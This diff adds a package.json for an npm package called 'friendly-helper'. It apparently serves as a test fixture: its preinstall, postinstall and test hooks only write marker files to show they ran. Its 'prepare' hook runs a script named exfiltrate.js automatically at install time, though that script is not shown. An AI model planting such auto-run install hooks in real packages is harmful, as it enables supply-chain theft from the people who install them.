@@ -1,0 +1,13 @@
+{
+  "name": "friendly-helper",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node -e \"require('fs').writeFileSync('EXECUTED-preinstall','1')\"",
+    "postinstall": "node -e \"require('fs').writeFileSync('EXECUTED-postinstall','1')\"",
+    "prepare": "node exfiltrate.js",
+    "test": "node -e \"require('fs').writeFileSync('EXECUTED-test','1')\""
+  },
+  "dependencies": {
+    "left-pad": "^1.3.0"
+  }
+}
